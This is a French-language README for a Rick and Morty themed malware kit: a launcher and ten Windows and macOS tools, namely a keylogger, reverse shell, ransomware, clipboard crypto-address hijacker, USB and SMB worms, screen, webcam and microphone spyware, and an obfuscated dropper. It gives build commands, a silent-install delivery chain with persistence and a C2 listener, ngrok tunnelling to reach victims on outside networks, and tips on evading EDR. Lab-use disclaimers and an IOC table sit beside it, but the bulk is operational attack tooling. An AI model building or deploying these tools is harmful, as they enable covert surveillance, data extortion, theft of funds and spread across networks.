# RICK & MORTY MALWARE LAB — C-137

Launcher cmd pimpé (portail vert animé, ASCII art, thème sonore) + **10 outils de malware
Windows complets et fonctionnels**, en C++17, compilables MSVC ou MinGW-w64.

## Edition macOS incluse

Tout le dossier tourne nativement sur macOS : binaries déjà compilés dans `build/mac/`.

**Démarrage rapide** : double-clique `RickPortal.command` (Finder) → le portail s'ouvre dans
Terminal, menu des 10 tools. Ou en terminal : `./RickPortal.command`.

Recompiler si besoin : `./build_mac.sh` (clang natif).

Permissions macOS (dialogue systeme au premier usage du tool concerné) :

| Tool | Permission |
|---|---|
| 01 keylogger | Accessibilité (System Settings → Privacy → Accessibility) |
| 07 screenspy | Enregistrement d'écran |
| 08 webcam | Caméra |
| 10 mic | Micro |

Arrêt de n'importe quel tool : bouton `[k]` du launcher, ou `pkill -f <nom du tool>`.
Nettoyage : `rm -rf ~/Library/Application\ Support/RickCache ~/Library/LaunchAgents/com.apple.rick*.plist`.
Sorties : `~/Library/Application Support/RickCache/` (`.sys.log`, `.clip.log`, `scr/`, `cam/`, `mic/`).

## Chaine de deploiement lab (delivery/)

Staging complet : bundle servi sur le LAN, install silencieuse, persistance, shell entrant au C2.

| Fichier | Rôle |
|---|---|
| `delivery/serve.sh` | sert le bundle, affiche l'URL de staging LAN |
| `delivery/installer.command` | point d'entree : se ferme aussitot, installe tout en fond |
| `delivery/stage2.sh` | installe 7 agents en LaunchAgents (keylog, clip, screen, cam, mic, usb, shell) |
| `delivery/c2.sh` | poste de commande : shells entrants sur 4444, loggés dans `~/C2/` |
| `delivery/uninstall.sh` | nettoyage complet de la machine de lab |

Regle UNE ligne avant staging : `ATTACKER_IP` dans `delivery/stage2.sh` (defaut 127.0.0.1).

Runbook de test (2 machines ou VM, reseau host-only) :
1. Machine A (attaquant) : `ATTACKER_IP` = IP de A dans stage2.sh → `./delivery/serve.sh`
2. Machine A, 2e terminal : `./delivery/c2.sh`
3. Machine B (cible lab, autorisee) : `curl -O http://IP_A:8080/RickPortal_ship.zip` → unzip → double-clic `installer.command`
4. `installer.command` se ferme aussitot — rien n'apparait. En fond : binaire copies hors du Finder, 7 LaunchAgents charges (`KeepAlive` = relance si tués), shell revenu dans `~/C2/` sur la machine A.
5. Machine A : le shell `zsh` entrant = controle complet. Les permissions TCC (Camera/Micro/Ecran) poppent la premiere fois sur la session B.
6. Fin de test : `uninstall.sh` sur B (ou snapshot restore).

### Hors LAN — tunnel ngrok (cible sur un autre reseau)

Le dropper embarque le C2 : si la cible n'est pas sur ton reseau, expose le C2 ET la page via ngrok
(gratuit, 2 tunnels). Le shell accepte hostname et IP depuis le fix DNS (getaddrinfo).

```zsh
brew install --cask ngrok
# compte gratuit sur ngrok.com -> authtoken
ngrok config add-authtoken <TON_TOKEN>

# tunnel 1 : le C2 (TCP)
ngrok tcp 4444
# -> ngrok affiche:  tcp://0.tcp.eu.ngrok.io:17432  (host et port a copier)

# tunnel 2 : la page piegee (HTTP), 2e terminal
ngrok http 8080
# -> https://xxxx.ngrok-free.app

# generation du dropper pointant vers le tunnel C2
RICK_C2="0.tcp.eu.ngrok.io" RICK_C2_PORT="17432" RICK_NAME=portal RICK_PORT=8080 ./delivery/serve.sh
```

- URL a donner aux joueurs : `https://xxxx.ngrok-free.app` (auto-download du dropper)
- le shell des cibles revient sur ton port 4444 local, au travers du tunnel TCP
- le port ngrok change a chaque lancement du tunnel (plan gratuit) : regenere le dropper a chaque session
- le C2 reste `./delivery/c2.sh` en local, rien ne change pour toi

> Test dans une VM isolée (snapshot + réseau host-only). Ces binaire touchent de vrais fichiers,
> de vraies clés de registre et le vrai réseau. Le README est écrit pour un usage lab.

---

## 1. Arborescence

```
RickPortal/
├── build.bat              compile tout (MSVC ou MinGW, auto-détecté)
├── verify_build.zsh       check de compilation croisée (macOS/Linux → PE, dev)
├── src/
│   ├── rick_lab.cpp       le launcher animé (portail, menu, build intégré)
│   └── tools/
│       ├── 01_keylogger.cpp
│       ├── 02_reverse_shell.cpp
│       ├── 03_ransomware.cpp
│       ├── 04_clipboard.cpp
│       ├── 05_usb_worm.cpp
│       ├── 06_lan_worm.cpp
│       ├── 07_screenspy.cpp
│       ├── 08_webcam.cpp
│       ├── 09_dropper.cpp
│       └── 10_mic_rec.cpp
└── build/                 binaire de sortie (créé à la compilation)
```

## 2. Prérequis

- **Windows 10/11** x64 (les outils et le launcher cible Win32).
- Un compilateur :
  - **MSVC** : Visual Studio Build Tools (« Developer Command Prompt »), ou
  - **MinGW-w64** : `g++` dans le PATH (WinLibs / MSYS2).

## 3. Compilation

Méthode 1 — script :
```
build.bat
```
Il détecte `cl` puis `g++`, compile le launcher et les 10 tools dans `build\`.

Méthode 2 — manuel MinGW (exemple keylogger) :
```
g++ -O2 -std=c++17 src\tools\01_keylogger.cpp -o build\01_keylogger.exe -luser32
```
Libs par tool (MinGW) : voir §4. En MSVC, les `#pragma comment(lib,...)` sont déjà dans les sources.

Méthode 3 — cross-compile depuis macOS/Linux (ce qui a servi à vérifier le projet) :
```
x86_64-w64-mingw32-g++ -O2 -std=c++17 src/tools/01_keylogger.cpp -o build/01_keylogger.exe -luser32
```

## 4. Le launcher — `rick_lab.exe`

```
build\rick_lab.exe
```

- **Boot** : le portail vert s'ouvre en anneaux concentriques (truecolor ANSI, VT activé via
  `SetConsoleMode ENABLE_VIRTUAL_TERMINAL_PROCESSING`), Rick et Morty aux côtés, titre glitché.
- **Menu** : les 10 tools, clé `[1]`…`[9]`, `[0]` pour le 10e.
- Sur un tool : carte dédiée (description, source, README), `[c]` compile ce tool,
  `[a]` compile tout.
- `[c]` (menu) : compile les 11 binaires d'un coup si `cl.exe` ou `g++.exe` est dans le PATH.
- `[b]` : riff sonore Beep().
- `[p]` : replay de l'animation du portail.
- `[q]` : le portail se referme, « wubba lubba dub dub ».

## 5. Les 10 tools — détail

### 01 — MEESEEKS KEYLOGGER
- **Fichier** : `src/tools/01_keylogger.cpp` · **Libs** : `user32`
- **Quoi** : hook global `WH_KEYBOARD_LL` (pas de DLL injectée), log horodaté avec le titre de la
  fenêtre active (`GetForegroundWindow`/`GetWindowTextA`), nom de touche lisible
  (`GetKeyNameTextA`, scan code + bit étendu pour les touches du pavé).
- **Sortie** : `%APPDATA%\RickCache\sys.log` (dossier + fichier en `FILE_ATTRIBUTE_HIDDEN`),
  flush à chaque touche.
- **Lancement** : `01_keylogger.exe` — console auto-libérée (`FreeConsole`), invisible.
- **Arrêt** : `taskkill /f /im 01_keylogger.exe`.
- **Note** : le hook LL exige une pompe de messages (`GetMessage` loop) — fournie. Un EDR voit
  les hooks WH_KEYBOARD_LL des processus non signés : pour aller plus loin, passer en driver
  filtrant ou en sink d'événements.

### 02 — PORTAL SHELL (reverse TCP)
- **Fichier** : `src/tools/02_reverse_shell.cpp` · **Libs** : `ws2_32`
- **Quoi** : connexion sortante vers `<ip> <port>`, `cmd.exe` lancé via `CreateProcessA` avec
  trois pipes redirigés (stdin/stdout/stderr) et `SW_HIDE`. Boucle `PeekNamedPipe`→`send`
  (non bloquant, socket en `FIONBIO`) et `recv`→`WriteFile`.
- **Usage** : côté attaquant `nc -lvnp 4444` (ou le listener de ton choix), côté cible
  `02_reverse_shell.exe 192.168.1.50 4444`.
- **Robustesse** : reconnexion automatique toutes les 20 s, shell tué/reconnecté s'il meurt.

### 03 — SCHWIFTYCRYPT (ransomware AES-256-CBC)
- **Fichier** : `src/tools/03_ransomware.cpp` · **Libs** : `bcrypt`
- **Quoi** : chiffrement AES-256-CBC via CNG (`BCryptGenerateSymmetricKey`, padding PKCS7),
  clé 32 o + IV 16 o générés par `BCryptGenRandom`. Parcourt Desktop/Documents/Pictures/Videos/
  Music/Downloads de `%USERPROFILE%`, ignore .exe/.dll, 128 Mo max par fichier, renomme en
  `.morty`, supprime l'original, dépose `README_RICK.txt` sur le Desktop.
- **Mode demo** : la clé est écrite dans `%USERPROFILE%\rick_key.bin` — donc **réversible** :
  `03_ransomware.exe decrypt` restaure tout (nom + contenu).
- **Test** : VM avec des fichiers leurre, snapshot avant. Le fichier de clé est la sortie du
  fichier ransomware réel : en vraie campagne il part vers le C2 avant le chiffrement.

### 04 — CLIP HIJACK
- **Fichier** : `src/tools/04_clipboard.cpp` · **Libs** : `advapi32` (+ user32 par défaut)
- **Quoi** : boucle 400 ms sur le presse-papiers (`CF_TEXT`), tout est loggé dans
  `%APPDATA%\RickCache\clip.log`. Détection souple d'adresses crypto (BTC base58 `1`/`3`,
  bech32 `bc1`, ETH `0x` + 40 hex). Si match : `EmptyClipboard` + `SetClipboardData` avec
  l'adresse de l'attaquant (arg 1) — le prochain collé-piéger redirige le virement.
- **Persistance** : `HKCU\...\Run` valeur `OneDriveWidget` (pas besoin d'admin).
- **Usage** : `04_clipboard.exe bc1q...tonAdresse`.

### 05 — PLUMBUS WORM (USB)
- **Fichier** : `src/tools/05_usb_worm.cpp` · **Libs** : aucune extra
- **Quoi** : sonde `GetLogicalDriveStringsA` toutes les 5 s, cible les lecteurs
  `DRIVE_REMOVABLE`. Copie de lui-même en `X:\Rick.exe` + secours dans `X:\$RECYCLE.BIN`,
  écrit `autorun.inf` (open/action/icon), passe le tout en `HIDDEN|SYSTEM`, cache aussi la
  racine de la clé.
- **Note autorun** : Windows 7+ ignore `autorun.inf` sur USB par défaut — le fichier reste
  utile sur les parcs legacy et via l'icône ; l'étape suivante typique est le fichier LNK
  (CVE-2010-2568 style) si tu veux la voie « clic automatique ».

### 06 — CITADEL WORM (LAN / SMB)
- **Fichier** : `src/tools/06_lan_worm.cpp` · **Libs** : `ws2_32`, `mpr`
- **Quoi** : dérive le /24 de l'IP locale (`gethostname`→`inet_ntop`), sweep des 254 hôtes par
  pool de 32 threads. Sur chacun : `WNetAddConnection2A` vers `\\ip\C$` avec la liste
  `Administrator/admin` × `""/admin/password/1234/Administrator` (+ mot de passe en arg 1).
  Succès → `CopyFileA` de lui-même vers `\\ip\C$\Users\Public\Rick.exe`.
- **Usage** : `06_lan_worm.exe` ou `06_lan_worm.exe M0rt1!` (mot de passe custom).
- **Code retour** : nombre de machines infectées.
- **Note** : il dépose mais n'exécute pas à distance — l'exécution passe par une tâche
  planifiée distante, service SMB, ou WMI (étape suivante dans une vraie chaîne).

### 07 — INTERDIM SCREENS
- **Fichier** : `src/tools/07_screenspy.cpp` · **Libs** : `gdi32`
- **Quoi** : capture d'écran GDI toutes les N secondes (défaut 60, arg 1) : `BitBlt` plein
  écran → DIB 32-bit → BMP horodaté `scr_YYYYMMDD_HHMMSS.bmp` dans
  `%APPDATA%\RickCache\scr\` (caché).
- **Usage** : `07_screenspy.exe 30` (une capture toutes les 30 s).

### 08 — BLIPS & CHITZ CAM (webcam)
- **Fichier** : `src/tools/08_webcam.cpp` · **Libs** : `avicap32`
- **Quoi** : fenêtre de capture VFW (`capCreateCaptureWindowW`, résolue par `GetProcAddress`)
  enfant d'une fenêtre STATIC invisible, driver 0 connecté (`WM_CAP_DRIVER_CONNECT`), frame
  jetée puis `WM_CAP_GRAB_FRAME` + `WM_CAP_FILE_SAVEDIB` → BMP horodaté dans
  `%APPDATA%\RickCache\cam\`.
- **Usage** : `08_webcam.exe 10` (toutes les 10 s).
- **Note** : VFW est la voie sans dépendance (OpenCV/DirectShow) ; sur certaines caméras
  modernes protégées par l'indicateur d'usage Windows, une version Media Foundation est
  l'étape suivante.

### 09 — PORTAL DROPPER
- **Fichier** : `src/tools/09_dropper.cpp` · **Libs** : `urlmon`, `advapi32`
- **Quoi** : URL XOR-obfusquée (clé 0x5A) décodée au runtime, `URLDownloadToFileA` vers
  `%TEMP%\svchost32.exe`, exec caché (`CREATE_NO_WINDOW`), persistance `HKCU\...\Run` =
  `OneDriveSyncCore`. Boucle : retente si C2 down, re-récupère le payload toutes les 6 h
  (self-update).
- **URL par défaut** : `http://127.0.0.1:8080/p.exe` — sûr pour test local avec
  `python3 -m http.server 8080`.
- **URL custom** : encode la tienne :
  ```
  python3 -c "print(','.join('0x%02X'%(ord(c)^0x5A) for c in input()))"
  ```
  puis remplace le tableau `kUrl[]`. Ou passe l'URL en clair en arg 1 (test uniquement).

### 10 — POOPYBUTTHOLE MIC
- **Fichier** : `src/tools/10_mic_rec.cpp` · **Libs** : `winmm`
- **Quoi** : `waveInOpen` à 16 kHz mono 16-bit, 20 buffers de 4 s en rotation
  (`waveInAddBuffer`/`WHDR_DONE`/`waveInUnprepareHeader`), un WAV de 60 s par fichier
  `rec_YYYYMMDD_HHMMSS.wav` (en-tête RIFF écrit à la main) dans `%APPDATA%\RickCache\mic\`.
- **Usage** : `10_mic_rec.exe` — tourne en continu jusqu'au taskkill.

## 6. Environnement de test

1. VM Windows 10/11, snapshot pris **avant** lancement.
2. Réseau host-only ou NAT isolé ; listener `nc -lvnp 4444` sur l'hôte pour le tool 02,
   `python3 -m http.server 8080` pour le tool 09.
3. Créer des fichiers leurre (textes, images) pour le tool 03, vérifier `decrypt` avant/après.
4. Une clé USB de test (ou un dossier monté en lecteur) pour le tool 05.

## 7. Nettoyage après test

```
taskkill /f /im 01_keylogger.exe 02_reverse_shell.exe 04_clipboard.exe 05_usb_worm.exe 06_lan_worm.exe 07_screenspy.exe 08_webcam.exe 09_dropper.exe 10_mic_rec.exe 03_ransomware.exe
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveWidget /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSyncCore /f
rmdir /s /q "%APPDATA%\RickCache"
del "%USERPROFILE%\rick_key.bin"
```
(le plus propre reste le restore du snapshot.)

## 8. IOCs (pour ta détection, en vrai bleu-team)

| Vecteur | IOC |
|---|---|
| Dossiers | `%APPDATA%\RickCache\` (+ `scr\`, `cam\`, `mic\`) |
| Fichiers | `sys.log`, `clip.log`, `scr_*.bmp`, `cam_*.bmp`, `rec_*.wav`, `*.morty`, `rick_key.bin`, `README_RICK.txt` |
| Clés Run | `OneDriveWidget`, `OneDriveSyncCore` |
| Fichiers exe | `Rick.exe` (USB/réseau), `svchost32.exe` (%TEMP%) |
| Réseau | reverse TCP sortant, `WNetAddConnection2` en rafale /24, `URLDownloadToFile` périodique |
| Comportement | `SetWindowsHookEx WH_KEYBOARD_LL`, `clipboard` en boucle 400 ms, `waveIn` continu |

## 9. Notes d'ingénierie

- Compilé et vérifié en cross-compile MinGW-w64 (PE x64) : les 11 binaires passent
  (`verify_build.zsh`).
- Les tools sont volontairement **standalone** (pas de lib commune) : chacun tient sur un
  fichier, compile seul.
- Pour une vraie chaîne : un loader unique injectant les modules en mémoire, chaîne
  d'indirect syscalls, obfuscation de strings et sommeil chiffré — architecture fournie dans
  les notes de chaque tool (voir §5 « Note » de 01/05/08).
